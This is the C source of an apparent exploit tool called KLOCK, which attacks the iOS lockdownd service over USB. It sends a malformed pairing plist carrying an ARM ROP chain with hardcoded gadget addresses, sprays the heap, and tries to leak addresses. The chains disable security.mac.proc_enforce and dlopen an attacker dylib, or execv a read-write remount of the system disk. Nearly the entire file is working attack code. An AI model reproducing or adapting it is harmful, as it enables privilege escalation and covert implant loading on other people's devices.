/*
 * gcc -arch i386 -w -g -o klock lockdown_exploit.c -w -I/Users/armored/Documents/AppDev/libimobiledevice/include -I/opt/local/include -L/opt/local/lib -L/usr/local/lib -limobiledevice -lplist -liconv
 */

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <dirent.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <iconv.h>
#include <errno.h>

#include <libimobiledevice/libimobiledevice.h>
#include <libimobiledevice/lockdown.h>
#include <libimobiledevice/afc.h>
#include <libimobiledevice/diagnostics_relay.h>
#include "lleak.h"

#define LABEL_BUFF_LEN 0x5000

//buffer_txt -> stored in sp:
// on 4.1 3gs       = 0x00521000, 0x409000, 0x00387000, 0x40a000, 0x486000, 0x404000, 0xf3000, 0x49d000, 0x3ab000, 0x48b000, 0x4a6000
// on 4.1 3gs nojb  = 0xec000
// on 4.3.3 4g      = 0xf1000, 0x224000, 0x107b000, 0x13e000, 0x0107d000
int gLeak = 0;
int payload_base         = 0xec000;
int payload_ascii_offset = 0;           // 0x2020;
int rop1_ref             = 0;           // 0x4252302c; //0x0052302c + 0x42000000 'B' will be resetted

int rop2_adr             = 0x30562958;  // 0x30562958 -> pop {r0, r1, r2, r3, pc}
                                        // 0x330a76d4 -> pop {r4, r7, lr}; bx r3

int stack_adr            = 0;           // 0x42523050; //0x00523050 + 0x42000000 'B' will be resetted

int sendPayloadToLockdown(char *buffer, int length)
{
    uint16_t port = 0;
    idevice_t phone = NULL;
    idevice_connection_t connection = 0;
    idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;

    int data = ((unsigned char)length << 24) | ((unsigned short)(length & 0xFF00) << 8) | ((length & 0xFF0000u) >> 8) | ((length & 0xFF000000) >> 24);

    int sent_bytes = 0;
        
    ret = idevice_new(&phone, NULL);

    ret = idevice_connect(phone, 0xf27e, &connection);

    idevice_connection_send(connection, (const char*)&data, 4, &sent_bytes);
    idevice_connection_send(connection, (const char*)buffer, length, &sent_bytes);

    free(buffer);
    
    sent_bytes = 0;
    length = 0;
    buffer = 0;
    
    idevice_connection_receive_timeout(connection, (char*)&length, 4, &sent_bytes, 1500);
    
    int v4_length = length;
    
    data =  ((unsigned char)length << 24) | 
            ((unsigned short)(length & 0xFF00) << 8) | 
            ((length & 0xFF0000u) >> 8) | 
            ((length & 0xFF000000) >> 24);
    
    if (data)
    {
      //sent_bytes = 0;
      buffer = malloc(data);
      idevice_connection_receive_timeout(connection, buffer, data, &sent_bytes, 15000);
      free(buffer);
    }

    idevice_disconnect(connection);

    if (sent_bytes == 0)
        return 1;
 
    return 0;
}
int sendPayloadToLockdownForSpray(char *buffer, int length)
{
    uint16_t port = 0;
    idevice_t phone = NULL;
    idevice_connection_t connection = 0;
    idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;

    int data = ((unsigned char)length << 24) | ((unsigned short)(length & 0xFF00) << 8) | ((length & 0xFF0000u) >> 8) | ((length & 0xFF000000) >> 24);

    int sent_bytes = 0;
        
    ret = idevice_new(&phone, NULL);

    ret = idevice_connect(phone, 0xf27e, &connection);

    idevice_connection_send(connection, (const char*)&data, 4, &sent_bytes);
    idevice_connection_send(connection, (const char*)buffer, length, &sent_bytes);

 
    return 0;
}

/*
char *setupLabelBuffer()
{
    int i = 0;
    char *buffer = (char*)malloc(LABEL_BUFF_LEN+12);

    for(i=0; i < LABEL_BUFF_LEN+12; i++)
        buffer[i] = 'N';

    int uni_len = strlen("\u74d4\u330e");
    int base = buffer+payload_ascii_offset;

    // length of unicode label string = 8188 this is correct
    memcpy(base,"\u74d4\u330e", uni_len); // 0x330e74d4

    // /usr/libexec/oah/Shims = 0x2FE24580
    // dlopen = 0x32fd45c4
    // rpo3 = 0x330a76d8
    // length of unicode label string = 8184
    memcpy(base + 6,"\u4580\u2fe2", uni_len); 
    memcpy(base + 12 + 2 + 2,"\u45c5\u32fd", uni_len); 
    memcpy(base + 18 + 2 + 2,"\u76d8\u330a", uni_len); // 0x330e74d4

    return buffer;
}

int findLabelInXMl(char *buffer)
{
    int *ptr = (int*)buffer;
    int i=0;

    for(;;i+=4)
    {
        if (*ptr++ == 0x4e4e4e4e)
            break;
    }

    return (char*)ptr - buffer;
}

char *convertROPtoUTF(int opCode)
{
    static char utfOpCode[64];

    memset(utfOpCode, 0, 64);

    short hiOp = (opCode & 0xFFFF0000) >> 16;
    short loOp = (opCode & 0x0000FFFF);

    sprintf(utfOpCode, "\\u%.4hx\\u%.4hx", loOp, hiOp);

    return utfOpCode;
}

*/

int appendUTF8Word(int ucn, char *base)
{
    size_t inleft = 4;
    size_t outleft = 256;
    iconv_t cd;
    int _inptr = ucn;
    int *inptr = &_inptr;
    char _utf8Buff[256];
    char **utf8Buff = _utf8Buff;
    int len;

    if ((cd = iconv_open("UTF8", "UNICODELITTLE")) == (iconv_t)(-1)) 
    {
        printf( "Cannot open converter\n");
        return 0;
    }
    
    int rc = iconv(cd, &inptr, &inleft, &utf8Buff, &outleft);

    if (rc == -1) 
    {
        printf("Error in converting characters\n");

        if(errno == E2BIG)
            printf("errno == E2BIG\n");
        if(errno == EILSEQ)
            printf("errno == EILSEQ\n");
        if(errno == EINVAL)
            printf("errno == EINVAL\n");

        iconv_close(cd);
        return 0;
    }

    iconv_close(cd);
    
    len = 256-outleft;

    memcpy(base, _utf8Buff, len); // 0x330e74d4

    return len;
}

int appendUTF8String(char *instring, char *base)
{
    int _inptr;
    int len = 0;
    int pad = 0;
    int pad_rest = 0;

    pad_rest = strlen(instring)%sizeof(int);

    if (pad_rest)
        pad = 1;
    
    int padlen = sizeof(int)*((strlen(instring)/sizeof(int)) + pad);
    pad_rest = padlen - strlen(instring);

    char *_istring = (char*)malloc(padlen);
    memset(_istring, 0, padlen);
    memcpy(_istring, instring, strlen(instring));
    
    if (pad_rest > 1)
        _istring[strlen(instring)+1] = 0xF0;

    int * istring = (int*)_istring;
    
    do{
        _inptr = *istring++;

        // short _inptrlo =  _inptr & 0x0000FFFF;
        // short _inptrhi = (_inptr & 0xFFFF0000) >> 16;
        // _inptr = (_inptrlo << 16) + _inptrhi;

        int tmplen = appendUTF8Word(_inptr, base);
            
        base += tmplen;

        len  += tmplen;

    } while (istring < (_istring+padlen));

    return len;
}

char *dlopenROPLabelBuffer()
{
    int i = 0;
    
    int len = 0;

    char *buffer = (char*)malloc(LABEL_BUFF_LEN+12);

    for(i=0; i < LABEL_BUFF_LEN+12; i++)
        buffer[i] = 'N';

    int base = buffer+payload_ascii_offset;

    // length of unicode label string = 8188 this is correct
    
    // /usr/libexec/oah/Shims = 0x2FE24580
    // dlopen = 0x32fd45c5
    // rpo3 = 0x330a76d8
    // length of unicode label string = 8184

    len = appendUTF8Word(0x330e74d4, base);
    
    base += len;

    len = appendUTF8Word(0x2fe24580, base);

    base += len;
    base += 6;  // space for r1,r2,r3

    len = appendUTF8Word(0x32fd45c5, base);

    // base += len;
    
    // len = appendUTF8Word(0x330a76d8, base);

    return buffer;
}

#define ROP_PARAM_OFF 256

char *sysctlAndDlopenROPLabelBuffer()
{
    int i = 0;
    int len = 0;

    char *buffer = (char*)malloc(LABEL_BUFF_LEN+12);

    for(i=0; i < LABEL_BUFF_LEN+12; i++)
        buffer[i] = 'N';

    char *base = buffer +  payload_ascii_offset;

    if (gLeak) {    
        len = appendUTF8Word(0x43434343, base); base += len;     // r0
        len = appendUTF8Word(0x43434343, base); base += len;     // r1
    
        return buffer;
    }
    /*
     * sysctlbyname(const char *name, void *oldp, size_t *oldlenp, void *newp, size_t newlen);
     * sysctlbyname("security.mac.proc_enforce",  &proc_enforce,  &size, NULL, 0); ;
     */

    char *name  = "security.mac.proc_enforce";
    char *dlybn = "/var/mobile/id/dm";

    // offset devono essere ricalcolati tenendo conto che la stringa e' 
    // convertita in UTF16
    int name_addr    = payload_base + (payload_ascii_offset + ROP_PARAM_OFF)*2 - 152;
    int dlybn_addr   = name_addr  + (strlen(name)  + 1 + sizeof(int)) + 2;
    int oldp_addr    = dlybn_addr + (strlen(dlybn) + 1 + sizeof(int)) + 2;
    int oldlenp_addr = oldp_addr + sizeof(int);//0x3440b080;// contiene 4 (in corefoundation) //
    

    /*
     * r0: name          :
     * r1: &proc_enforce :
     * r2: &size         :
     * r3: 0x00000000    : 
     * pc: 0x32ffe9a8    : sysctlbyname
     * sp: 0x00000000    : 0

        30562958 e8bd800f pop {r0, r1, r2, r3, pc}
                 
                 0xAAAAAA : r0
                 0xAAAAAA : r1
                 0xAAAAAA : r2
                 30562958 : r3
                 330a76d4 : pc

        330a76d4 e8bd4090 pop {r4, r7, lr}
        330a76d8 e12fff13 bx  r3

                 0xAAAAAA : r4
                 0xAAAAAA : r7
                 30562958 : lr

        0x330e74d4 : ldr sp, [r0, #40]
        0x330e74d8 : ldr r0, [r0, #36]
        0x330e74dc : bx  r0 = 
     */   

    len = appendUTF8Word(0x330e74d4, base); base += len; 

    // 30562958 e8bd800f pop {r0, r1, r2, r3, pc}
    len = appendUTF8Word(0x43434343, base); base += len;     // r0
    len = appendUTF8Word(0x43434343, base); base += len;     // r1
    len = appendUTF8Word(0x43434343, base); base += len;     // r2
    len = appendUTF8Word(0x30562958, base); base += len;     // r3 
    len = appendUTF8Word(0x330a76d4, base); base += len;     // pc -> 330a76d4 e8bd4090 pop {r4, r7, lr}
    
    // setta lr
    // 330a76d4 e8bd4090 pop {r4, r7, lr}
    len = appendUTF8Word(0xAAAAAAAA, base); base += len;    // r4
    len = appendUTF8Word(0xAAAAAAAA, base); base += len;    // r7
    len = appendUTF8Word(0x330e19b4, base); base += len;    // lr -> 330e19b4 e8bd800f pop {r0, r1, r2, r3, pc}

    // 330a76d8 e12fff13 bx  r3 -> pop {r0, r1, r2, r3, pc}

    // 30562958 e8bd800f pop {r0, r1, r2, r3, pc}
    len = appendUTF8Word(name_addr,  base); base += len;     // r0
    len = appendUTF8Word(oldp_addr,  base); base += len;     // r1
    len = appendUTF8Word(oldlenp_addr, base); base += len;   // r2
    len = appendUTF8Word(0x30e9a770, base); base += len;     // r3 => in iokit contiente 00000000
    len = appendUTF8Word(0x32ffe9a9, base); base += len;     // pc = 0x34759150 -> pop {r4, r5, r6, r7, pc}   
    len = appendUTF8Word(0x00040004, base); base += len;     // newlen : al ritorno sara' poppato in r0
    
    // lr -> 0x330e19b4 e8bd800f pop {r0, r1, r2, r3, pc} riallinea lo stack
    len = appendUTF8Word(0xAAAAAAAA,  base); base += len;    // r1
    len = appendUTF8Word(0xAAAAAAAA,  base); base += len;    // r2
    len = appendUTF8Word(0xAAAAAAAA,  base); base += len;    // r3 
    len = appendUTF8Word(0x30562958,  base); base += len;    // pc

    // 30562958 e8bd800f pop {r0, r1, r2, r3, pc} 
    len = appendUTF8Word(dlybn_addr, base); base += len;     // r0: dylib_path
    len = appendUTF8Word(0x02020202, base);  base += len;    // r1: rtl_now
    len = appendUTF8Word(0x43434343, base); base += len;     // r2: nop
    len = appendUTF8Word(0x44444444, base); base += len;     // r3: nop 
    len = appendUTF8Word(0x32fd45c5, base); base += len;     // pc: 0x32fd45c5 -> dlopen

    // Params
    base = buffer +  payload_ascii_offset + ROP_PARAM_OFF;

    len = appendUTF8String(name, base);
    base += (len + sizeof(int)/2);

    len = appendUTF8String(dlybn, base);
    base += (len + sizeof(int)/2);

    len = appendUTF8Word(0x40404040, base); // oldp 
    base += len;

    len = appendUTF8Word(0x00000004, base); // oldplen

    return buffer;
}

char *execvROPLabelBuffer()
{
    int i = 0;
    int len = 0;

    char *buffer = (char*)malloc(LABEL_BUFF_LEN+12);

    for(i=0; i < LABEL_BUFF_LEN+12; i++)
        buffer[i] = 'N';

    /*
     char *argv[] = "/sbin/mount", "-v", "-t hfs", "-o rw", "/dev/disk0s1s1", 0};
     execv("/sbin/mount", argv)
     execv = 0x33022160;
     */

    char *base = buffer +  payload_ascii_offset;

    char *argv0 = "/sbin/mount";
    char *argv1 = "-v";
    char *argv2 = "-t hfs";
    char *argv3 = "-o rw";
    char *argv4 = "/dev/disk0s1s1";

    // offset devono essere ricalcolati tenendo conto che la stringa e' 
    // convertita in UTF16
    int argv0_addr = payload_base + (payload_ascii_offset + ROP_PARAM_OFF)*2 - 12;
    int argv1_addr = argv0_addr + strlen(argv0) + 1 + sizeof(int);
    int argv2_addr = argv1_addr + strlen(argv1) + 1 + sizeof(int);
    int argv3_addr = argv2_addr + strlen(argv2) + 1 + sizeof(int);
    int argv4_addr = argv3_addr + strlen(argv3) + 1 + sizeof(int);
    int argv_addr  = argv3_addr + strlen(argv3) + 1 + sizeof(int);

    /*
     * r0: argv0        :
     * r1: argv         :
     * r2: 0x004e004e   :
     * r3: 0x33022160   : execv
     * pc: 0x330a76d8   : bx r3
     */

    len = appendUTF8Word(0x330e74d4, base);
    base += len;
    
    len = appendUTF8Word(argv0_addr, base);
    base += len;

    len = appendUTF8Word(argv_addr+0x18, base);
    base += len;
    base += 2; // space for r2

    len = appendUTF8Word(0x33022160, base);   
    base += len;

    len = appendUTF8Word(0x330a76d8, base);
    
    base = buffer +  payload_ascii_offset + ROP_PARAM_OFF;

    len = appendUTF8String(argv0, base);
    base += (len + sizeof(int)/2);

    len = appendUTF8String(argv1, base);
    base += (len + sizeof(int)/2);

    len = appendUTF8String(argv2, base);
    base += (len + sizeof(int)/2);
    
    len = appendUTF8String(argv3, base);
    base += (len + sizeof(int)/2);
    
    len = appendUTF8String(argv4, base);
    base += (len + sizeof(int)/2);

    len = appendUTF8Word(argv0_addr, base);
    base += len;

    len = appendUTF8Word(argv1_addr, base);
    base += len;

    len = appendUTF8Word(argv2_addr+1, base);
    base += len;

    len = appendUTF8Word(argv3_addr+2, base);
    base += len;

    len = appendUTF8Word(argv4_addr+4, base);
    base += len;

    return buffer;
}

char *setupBogusPairRequestDictionary()
{
    static char buffer_req[256];
    // char *buffer_req = (char*)malloc(LABEL_BUFF_LEN*2);
    // int i;
    // for(i=0;i<LABEL_BUFF_LEN*2;i++)
    //     buffer_req[i]='N';
    // buffer_req[0] = '0';buffer_req[1] = '?';buffer_req[2] = '?';buffer_req[3] = '?';buffer_req[4] = '?';

    /*
     Bogus dictionary struct:
      R5->  0x17d070:   0x3e80383c      0x0100078c      0x3f3f3031      0x62613f3f
            0x17d080:   0x66656463      0x6c696867      0x0052302c(a)   0x41414141
            0x17d090:   0x41414141      0x30562958(e)   0x00523050(b)   0x41414141
            0x17d0a0:   0x41414141      0x41414141      0x00004141      0x00000000

     Bogus Label string:
      payload_base =    0x521000:   0x3e80383c      0x01000790  0x00001ffc  0x003f003f
                        0x521010:   0x003f003f      0x003f003f  0x003f003f  0x003f003f
                        ....
                        0x52302c:   0x003f003f      0x003f003f  0x003f003f  0x003f003f
                        0x52303c:   0x003f003f      0x003f003f  0x003f003f  0x003f003f
                        0x52304c:(d)0x330e74d4   (c)0x003f003f  0x003f003f  0x003f003f
                        0x52305c:   0x003f003f      0x003f003f  0x003f003f  0x003f003f

    
    dictionary bug:

    344BCD80 LDR R3, [R5,#0x18] ; // R5 -> bogus dictionary (NSString) R3 = (a)
    ...
    344BCD8C LDR R3, [R3,#0x20]  ; // R3 = *((a) + 0x20) = *(0x0052302c+0x20) = 0x330e74d4
    344BCD90 LDR R8, [R1,R6,LSL#2]
    344BCD94 MOV R1, R2
    344BCD98 BLX R3 ; BLX 0x330e74d4
    ...
    rop1_address:
    330e74d4 e590d028 ldr sp, [r0, #40] ; sp = *(r0=0x17d070 + 40) = (b) = 0x00523050 -> (c)
    330e74d8 e5900024 ldr r0, [r0, #36] ; r0 = *(r0=0x17d070 + 36) = (e) = 0x30562958 
    330e74dc e12fff10 bx r0
    ...

    rop2_address
    30562958 e8bd800f pop {r0, r1, r2, r3, pc}

    rpo3_address:
    330a76d8 e12fff13 bx r3
    */
    
    sprintf(buffer_req,
            "0????abcdefghil"
            "XXXX"                /*(a)*/
            "AAAAAAAA" 
            "YYYY"                /*(e)*/
            "ZZZZ"                /*(b)*/
            "AAAAAAAAAAAAAA");

    memcpy(buffer_req + 15, &rop1_ref, 4);
    memcpy(buffer_req + 15 + 4 + 8, &rop2_adr, 4);
    memcpy(buffer_req + 15 + 4 + 8 + 4, &stack_adr, 4);

    return buffer_req;
}

void adjustHiByteAddress(char *buffer)
{
    int buff_req_off = 246; // int aligned = 241

    buffer[buff_req_off + 18]    = 0x0;
    buffer[buff_req_off + 18 + 16] = 0x0;
}

char *createLockdownPlistForSpray(int *length)
{
    plist_t dict = plist_new_dict();

    plist_dict_insert_item(dict, "Request", plist_new_string("Pair"));
    
    plist_dict_insert_item(dict, "Label", plist_new_string(sysctlAndDlopenROPLabelBuffer())); 

    char *buffer_xml = NULL;
    uint32_t length_xml = 0;

    plist_to_xml(dict, &buffer_xml, &length_xml);

    //patchExecvRopLabelBuffer(buffer_xml);

    plist_free(dict);
    
    *length = length_xml;

    return buffer_xml;
}

char *createLockdownPlist(int *length)
{
    plist_t dict = plist_new_dict();

    plist_dict_insert_item(dict, "Request", plist_new_string("Pair"));
    
    plist_dict_insert_item(dict, "PairRecord", plist_new_string(setupBogusPairRequestDictionary()));

    plist_dict_insert_item(dict, "Label", plist_new_string(sysctlAndDlopenROPLabelBuffer())); 

    char *buffer_xml = NULL;
    uint32_t length_xml = 0;

    plist_to_xml(dict, &buffer_xml, &length_xml);

    //patchExecvRopLabelBuffer(buffer_xml);

    plist_free(dict);
    
    *length = length_xml;

    return buffer_xml;
}

char getAsciiByte(char in)
{
    char retByte;
    int i;

    for (i=0x10; i < 0x80; i+=0x10)
    {
        retByte = in + i*2;
        
        if (retByte < 0x80 && retByte > 0x00)
            break;
    }

    return i;
}

void adjustRopAddr()
{
 
    char hiByte = (payload_base & 0x0000FF00) >> 8;
    char loByte = (payload_base & 0x000000FF);
   
    int p_utf_off_hi = getAsciiByte(hiByte);
    int p_utf_off_lo = getAsciiByte(loByte);

    payload_ascii_offset = (p_utf_off_hi << 8) | (p_utf_off_lo);

    rop1_ref    = payload_base + payload_ascii_offset*2 + 0xC - 0x20 + 0x43000000; 
    //try to leak the label buffer heap address....
    //rop1_ref = 0x401590 - 0x18 + 0x43000000;
    
    stack_adr   = payload_base + payload_ascii_offset*2 + 0xC + 0x04 + 0x43000000;
}

void adjustRopAddrForLeak()
{
    char hiByte = (payload_base & 0x0000FF00) >> 8;
    char loByte = (payload_base & 0x000000FF);
   
    int p_utf_off_hi = getAsciiByte(hiByte);
    int p_utf_off_lo = getAsciiByte(loByte);

    payload_ascii_offset = (p_utf_off_hi << 8) | (p_utf_off_lo);

    rop1_ref    = payload_base + payload_ascii_offset + 0x43000000;    
    stack_adr   = payload_base + payload_ascii_offset + 0x43000000;
}

void tryToSprayLabelBuffer()
{
    char *buffer_xml = NULL;
    uint32_t length_xml = 0;

    buffer_xml = createLockdownPlistForSpray(&length_xml);

    printf("Spray heap for label buffer.\n");

    sleep(1);
    
    int i;

    for (i=0; i < 50; i++)
    {   
        printf("Spray no.%d\n", i);
        int pid = fork();
        if (pid == 0)
        {
            sleep(1);
            sendPayloadToLockdownForSpray(buffer_xml, length_xml);
            sleep(120);
            exit(0);
        }
    }
    sleep(30);
}

int exploiting(int flag)
{
    char *buffer_xml = NULL;
    uint32_t length_xml = 0;

   // if (flag){
        adjustRopAddr();
    // } else {
    //     adjustRopAddrForLeak();
    //     gLeak = 1;
    // }
    // //tryToSprayLabelBuffer();

    printf("\nKLOCK: lockdownd superuser out-of-sbox exploit.\n\n"
           "By Ki0doPluz\n");

    printf("creating PairRecord payload...\n");

    buffer_xml = createLockdownPlist(&length_xml);

    printf("done.\n");

    printf("adjusting addresses...\n");

    sleep(1);

    // no for find leak...
    adjustHiByteAddress(buffer_xml);
    
    printf("done.\n");

    printf("exploiting on [0x%.4x], [0x%.4x], [0x%.4x]\n", 
           payload_base, rop1_ref & 0x00FFFFFF, stack_adr & 0x00FFFFFF);

    printf("sending exploit...\n");
    sleep(1);

    int retVal = sendPayloadToLockdown(buffer_xml, length_xml);
    
    if (retVal == 1)
        printf("Exploting done.\n");
    else
        printf("Exploting failed.\n");

    return 0;
}

int main(int argc, char **argv)
{
    if (argc == 1) {
        exploiting(1);
        return 0;
    }

    int i;
    for(i=32; i<33; i++)
    {
        printf("try leak no.%d\n", i);
        payload_base = leak_array[i];
        exploiting(0);
        sleep(10);
    }

    return 0;
}